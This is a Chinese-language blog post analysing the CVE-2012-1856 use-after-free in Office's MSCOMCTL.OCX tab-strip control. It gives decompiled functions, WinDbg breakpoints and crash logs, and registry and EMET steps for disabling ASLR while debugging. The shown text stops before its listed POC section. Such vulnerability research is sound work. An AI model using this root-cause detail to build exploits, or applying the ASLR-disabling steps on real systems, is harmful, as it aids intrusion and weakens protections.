<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="Analyze打开样本文件，并没有发生crash不过关闭的时候，EXECL会发生错误在关闭文件时attach进程，即可看到crash位置：对应位置在CObjColl::Clear： 1234567891011121314151617181920212223242526272829int __thiscall CObjColl::Clear(#243 *this)&amp;#123;  #243 *v1;">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2012-1856 Office UAF">
<meta property="og:url" content="http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="Analyze打开样本文件，并没有发生crash不过关闭的时候，EXECL会发生错误在关闭文件时attach进程，即可看到crash位置：对应位置在CObjColl::Clear： 1234567891011121314151617181920212223242526272829int __thiscall CObjColl::Clear(#243 *this)&amp;#123;  #243 *v1;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-a9dddf9c44a78f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-0e7160c9664aeb9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-1ff6c810b5008584.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-4977249aaaf8663e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-6b066e0f392dda25.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9027235-3852816d03154c13.gif?imageMogr2/auto-orient/strip">
<meta property="article:published_time" content="2019-03-05T14:53:56.000Z">
<meta property="article:modified_time" content="2019-05-17T00:26:40.000Z">
<meta property="article:author" content="Kirin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9027235-a9dddf9c44a78f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>CVE-2012-1856 Office UAF</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/03/07/Real-World-Finals-2018-Router/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/03/02/CVE-2013-0750-Firefox/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&text=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&is_video=false&description=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2012-1856 Office UAF&body=Check out this article: http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&name=CVE-2012-1856 Office UAF&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">2.</span> <span class="toc-text">POC</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2012-1856 Office UAF
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-03-05T14:53:56.000Z" itemprop="datePublished">2019-03-05</time>
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>打开样本文件，并没有发生crash<br>不过关闭的时候，EXECL会发生错误<br>在关闭文件时attach进程，即可看到crash位置：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-a9dddf9c44a78f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="crash"><br>对应位置在CObjColl::Clear：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __thiscall CObjColl::Clear(#<span class="number">243</span> *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  #<span class="number">243</span> *v1; <span class="comment">// esi</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">this</span>;</span><br><span class="line">  CObjColl::ClearTree(<span class="keyword">this</span>);</span><br><span class="line">  v2 = (_DWORD *)*((_DWORD *)v1 + <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (_DWORD *)v2[<span class="number">10</span>];</span><br><span class="line">      v5 = v2[<span class="number">7</span>];</span><br><span class="line">      v2[<span class="number">18</span>] = <span class="number">0</span>;</span><br><span class="line">      (*(<span class="keyword">void</span> (__stdcall **)(_DWORD *))(v5 + <span class="number">8</span>))(v2 + <span class="number">7</span>);<span class="comment">// free here</span></span><br><span class="line">      v2 = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)v1 + <span class="number">17</span>) = <span class="number">-1</span>;</span><br><span class="line">  *((_DWORD *)v1 + <span class="number">15</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)v1 + <span class="number">9</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)v1 + <span class="number">10</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)v1 + <span class="number">11</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>动态调试看到正常调用链:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CListItem::Release-&gt;</span><br><span class="line">CObj::ExternalRelease-&gt;</span><br><span class="line">CUnknownObject::CPrivateUnknownObject::Release-&gt;</span><br><span class="line">CTab::&#96;scalar deleting destructor&#39;</span><br></pre></td></tr></table></figure>
<p>在CTab::`scalar deleting destructor’中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CTab *__thiscall CTab::&#96;scalar deleting destructor&#39;(CTab *this, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  CTab *v2; &#x2F;&#x2F; esi</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; this;</span><br><span class="line">  CTab::~CTab(this);</span><br><span class="line">  if ( a2 &amp; 1 &amp;&amp; v2 )</span><br><span class="line">    HeapFree(g_hHeap, 0, (LPVOID)v2);</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到首先调用CTab析构函数而后free掉此CTab结构<br>同时可以看到CTab析构函数的调用关系：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CTab::~CTab-&gt;</span><br><span class="line">CObj::~CObj-&gt;</span><br><span class="line">CAutomationObject::~CAutomationObject</span><br></pre></td></tr></table></figure>
<p>由此也可以看出三个类之间的继承关系：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CAutomationObject-&gt;CObj-&gt;CTab</span><br></pre></td></tr></table></figure>
<p>大致猜测漏洞：此CTab结构体在最后CObjColl::Clear进行处理前已被释放，此heap chunk被重新分配，原本对应用于调用析构函数的偏移处被其他数据填充<br>下面便是定位具体free的地方<br>第一想法就是关闭ALSR，此时对应触发UAF的chunk地址确定，下硬件断点跟踪程序流即可<br><strong>关于Windows下关闭ALSR<br>Windows 7前直接修改注册表：<br>在<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session
Manager\Memory Management</code><br>下添加dword变量MoveImages=00000000 即可<br>Windows 7及其后，需要使用EMET关闭:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;support.microsoft.com&#x2F;zh-cn&#x2F;help&#x2F;2909257&#x2F;emet-mitigations-guidelines</span><br></pre></td></tr></table></figure>
<p>（理论上支持win10/8/7,但是windows10上总是安装不成功，只好在Windows7上使用）<br><img src="https://upload-images.jianshu.io/upload_images/9027235-0e7160c9664aeb9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="EMET"><br>不过比较坑的一点是关闭ALSR后栈地址固定，堆地址依然随机（这里不太明白，和Linux很不一样??）<br>选择另一个方案，打开文件后拍摄快照，crash后记下对应地址，又出现了一个坑，第一次跟踪：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; ba r4 38cc7c-0x1c</span><br><span class="line">0:005&gt; g</span><br><span class="line">SetContext failed, 0x80070005</span><br><span class="line">MachineInfo::SetContext failed - Thread: 008D78B8  Handle: 4c8  Id: 67c - Error &#x3D;&#x3D; 0x80070005</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax&#x3D;27586488 ebx&#x3D;00000000 ecx&#x3D;0038cc60 edx&#x3D;00389100 esi&#x3D;00387af0 edi&#x3D;0038cfb0</span><br><span class="line">eip&#x3D;27587a15 esp&#x3D;0018d0b8 ebp&#x3D;0018d128 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00000202</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\SysWOW64\MSCOMCTL.OCX - </span><br><span class="line">MSCOMCTL+0x7a15:</span><br><span class="line">27587a15 ff5008          call    dword ptr [eax+8]    ds:002b:27586490&#x3D;27587af1</span><br></pre></td></tr></table></figure>
<p>单步执行返回找到调用处为CObjColl::Clear<br>重新恢复后下条件断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bu 27582E14  &quot;.printf \&quot;Cobj::Clear-&gt;%08x\\n\&quot;,eax;g;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/9027235-1ff6c810b5008584.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Address"><br>可以看到0x38CC60处被clear了两次，第二次时即会crash<br>不过实际上只有这一次是关闭文件时触发了漏洞<br>正常情况下应该是打开文件时触发了free，因为后来复现的时候没有一次出现关闭文件时两次free情况（第一次不知道怎么触发的关闭文件时double free，保存了快照以后研究）<br>这时候选择从开始打开就下条件断点查看Cobj::Clear过程<br>因为MSCOMCTL.OCX开始未加载，无法直接下断，打开文件后才会加载，所以要在MSCOMCTL.OCX加载后文件打开前下断，因为MSCOMCTL.OCX加载基址固定，直接在对应位置下硬件断点，在LoadBinary后即可下断Cobj::Clear</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">Cobj::Clear-&gt;005a89e0</span><br><span class="line">Cobj::Clear-&gt;005a8a78</span><br><span class="line">Cobj::Clear-&gt;005a8a78</span><br><span class="line">Cobj::Clear-&gt;005a8b10</span><br><span class="line">Cobj::Clear-&gt;005a8cd8</span><br><span class="line">Cobj::Clear-&gt;005a8ea0</span><br><span class="line">Cobj::Clear-&gt;005a9068</span><br><span class="line">Cobj::Clear-&gt;005a9230</span><br><span class="line">Cobj::Clear-&gt;005a93f8</span><br><span class="line">Cobj::Clear-&gt;005a95c0</span><br><span class="line">Cobj::Clear-&gt;005a9788</span><br><span class="line">Cobj::Clear-&gt;005a9950</span><br><span class="line">Cobj::Clear-&gt;005a9b18</span><br><span class="line">Cobj::Clear-&gt;005a9ce0</span><br><span class="line">Cobj::Clear-&gt;005a9ea8</span><br><span class="line">Cobj::Clear-&gt;005aa070</span><br><span class="line">Cobj::Clear-&gt;005aa238</span><br><span class="line">Cobj::Clear-&gt;005aa400</span><br><span class="line">Cobj::Clear-&gt;005aa5c8</span><br><span class="line">Cobj::Clear-&gt;005aa790</span><br><span class="line">Cobj::Clear-&gt;06c722b8</span><br><span class="line">Cobj::Clear-&gt;06c72480</span><br><span class="line">Cobj::Clear-&gt;06c72648</span><br><span class="line">Cobj::Clear-&gt;06c72810</span><br><span class="line">Cobj::Clear-&gt;06c729d8</span><br><span class="line">Cobj::Clear-&gt;06c72ba0</span><br><span class="line">Cobj::Clear-&gt;06c72d68</span><br><span class="line">Cobj::Clear-&gt;06c72f30</span><br><span class="line">Cobj::Clear-&gt;06c730f8</span><br><span class="line">Cobj::Clear-&gt;06c732c0</span><br><span class="line">Cobj::Clear-&gt;06c73488</span><br><span class="line">Cobj::Clear-&gt;06c73650</span><br><span class="line">(a30.198): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;06c7366c ebx&#x3D;00000000 ecx&#x3D;00730069 edx&#x3D;00000036 esi&#x3D;005ca67c edi&#x3D;0072006f</span><br><span class="line">eip&#x3D;27582e21 esp&#x3D;0018d024 ebp&#x3D;0018d0d0 iopl&#x3D;0         nv up ei pl nz na pe nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00010206</span><br><span class="line">MSCOMCTL+0x2e21:</span><br><span class="line">27582e21 ff5108          call    dword ptr [ecx+8]    ds:002b:00730071&#x3D;????????</span><br></pre></td></tr></table></figure>
<p>可以看到触发点并不是这里<br>不过通过第一次的crash位置，造成crash的delete位置在CButton的析构函数中，而Cobj::Clear也是循环调用CTab的析构函数，对几个主要析构函数下断，其中，CTab::~CTab下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bu 275A3FCF  &quot;.printf \&quot;CTab::~CTab-&gt;%08x\\n\&quot;,ecx;g;&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">CTab::~CTab-&gt;00658228</span><br><span class="line">CTab::~CTab-&gt;07f3b3c8</span><br><span class="line">CTab::~CTab-&gt;07f12608</span><br><span class="line">CTab::~CTab-&gt;07f3b3c8</span><br><span class="line">CTab::~CTab-&gt;07f54100</span><br><span class="line">CTab::~CTab-&gt;07f3a9a8</span><br><span class="line">CTab::~CTab-&gt;07f49ec0</span><br><span class="line">CTab::~CTab-&gt;07f63510</span><br><span class="line">CTab::~CTab-&gt;07f63890</span><br><span class="line">CTab::~CTab-&gt;00650af8</span><br><span class="line">CTab::~CTab-&gt;006808f0</span><br><span class="line">CTab::~CTab-&gt;00653df0</span><br><span class="line">CTab::~CTab-&gt;07f52978</span><br><span class="line">CTab::~CTab-&gt;07f52b70</span><br><span class="line">CTab::~CTab-&gt;0067e090</span><br><span class="line">CTab::~CTab-&gt;0067e288</span><br><span class="line">CTab::~CTab-&gt;0067e480</span><br><span class="line">CTab::~CTab-&gt;07f3f750</span><br><span class="line">CTab::~CTab-&gt;07f3f948</span><br><span class="line">CTab::~CTab-&gt;07f3fb40</span><br><span class="line">CTab::~CTab-&gt;07f3fd38</span><br><span class="line">CTab::~CTab-&gt;07f3ff30</span><br><span class="line">CTab::~CTab-&gt;07f424e0</span><br><span class="line">CTab::~CTab-&gt;07f426d8</span><br><span class="line">CTab::~CTab-&gt;07f428d0</span><br><span class="line">CTab::~CTab-&gt;07f42ac8</span><br><span class="line">CTab::~CTab-&gt;07f42cc0</span><br><span class="line">CTab::~CTab-&gt;07f42eb8</span><br><span class="line">CTab::~CTab-&gt;07f430b0</span><br><span class="line">CTab::~CTab-&gt;07f12020</span><br><span class="line">CTab::~CTab-&gt;07f12218</span><br><span class="line">CTab::~CTab-&gt;07f12410</span><br><span class="line">(3f4.9a4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;07f12624 ebx&#x3D;00000000 ecx&#x3D;66833fe6 edx&#x3D;000000e3 esi&#x3D;07f39bcc edi&#x3D;283628f0</span><br><span class="line">eip&#x3D;27582e21 esp&#x3D;0018d024 ebp&#x3D;0018d0d0 iopl&#x3D;0         nv up ei pl nz ac pe nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00010216</span><br><span class="line">MSCOMCTL+0x2e21:</span><br><span class="line">27582e21 ff5108          call    dword ptr [ecx+8]    ds:002b:66833fee&#x3D;????????</span><br></pre></td></tr></table></figure>
<p>可以看到最后Crash位置0x7f12624-0x1c=0x7f12608<br>而可以看到此位置在CTab析构函数中free过<br>直接在析构函数下断点，看到调用堆栈：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-4977249aaaf8663e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Call"><br>找到了关键位置：<br>在CTabStripCtrl::LoadBinaryState下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:275B50CD                 push    eax             ; unsigned __int8 **</span><br><span class="line">.text:275B50CE                 call    ?LoadBinaryStateFromMemory@CTabs@@QAEJPAPAE@Z ; CTabs::LoadBinaryStateFromMemory(uchar * *)</span><br><span class="line">DllGetClassObject+0x2709a:</span><br><span class="line">.text:275B50D3                 mov     edi, eax</span><br></pre></td></tr></table></figure>
<p>关键位置在DllGetClassObject+0x2709a上一步调用的函数下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">int __thiscall CTabs::LoadBinaryStateFromMemory(#271 *this, unsigned __int8 **a2)</span><br><span class="line">&#123;</span><br><span class="line">  #243 *v2; &#x2F;&#x2F; esi</span><br><span class="line">  int v3; &#x2F;&#x2F; ecx</span><br><span class="line">  int v4; &#x2F;&#x2F; ebx</span><br><span class="line">  #270 *v5; &#x2F;&#x2F; eax</span><br><span class="line">  int v6; &#x2F;&#x2F; edi</span><br><span class="line">  int v8; &#x2F;&#x2F; [esp-10h] [ebp-10h]</span><br><span class="line">  #270 *v9; &#x2F;&#x2F; [esp-Ch] [ebp-Ch]</span><br><span class="line">  unsigned __int8 *v10; &#x2F;&#x2F; [esp-8h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; this;</span><br><span class="line">  v3 &#x3D; *((_DWORD *)this + 18);</span><br><span class="line">  v10 &#x3D; *a2;</span><br><span class="line">  (*(void (__cdecl **)(int))(v3 + 56))((int)v2 + 72);</span><br><span class="line">  v8 &#x3D; 0;</span><br><span class="line">  v4 &#x3D; *(_DWORD *)v10;</span><br><span class="line">  v10 +&#x3D; 4;</span><br><span class="line">  if ( v4 &lt;&#x3D; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v6 &#x3D; 0;</span><br><span class="line">    *a2 &#x3D; v10;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 &#x3D; (#270 *)CtlNewDelete::operator new(0x90u, g_hHeap);</span><br><span class="line">      if ( v5 )</span><br><span class="line">        v9 &#x3D; CTab::CTab(v5, 0);</span><br><span class="line">      else</span><br><span class="line">        v9 &#x3D; 0;</span><br><span class="line">      if ( !v9 )</span><br><span class="line">        return -2147024882;</span><br><span class="line">      v6 &#x3D; CObjColl::AddItem(v2, v9, 0, 0);</span><br><span class="line">      if ( v6 &lt; 0 )</span><br><span class="line">        break;</span><br><span class="line">      v6 &#x3D; CTab::LoadBinaryStateFromMemory(v9, &amp;v10);</span><br><span class="line">      if ( v6 &lt; 0 )</span><br><span class="line">        break;</span><br><span class="line">      if ( ++v8 &gt;&#x3D; v4 )</span><br><span class="line">        goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v9 )</span><br><span class="line">      (*(void (__cdecl **)(int))(*((_DWORD *)v9 + 7) + 8))((int)v9 + 28);</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>流程，循环申请0x90大小空间，并初始化CTab对象，而后调用CObjColl::AddItem将其加入列表中，紧接着调用CTab::LoadBinaryStateFromMemory，注意到CTabStripCtrl::LoadBinaryState中的过程：</p>
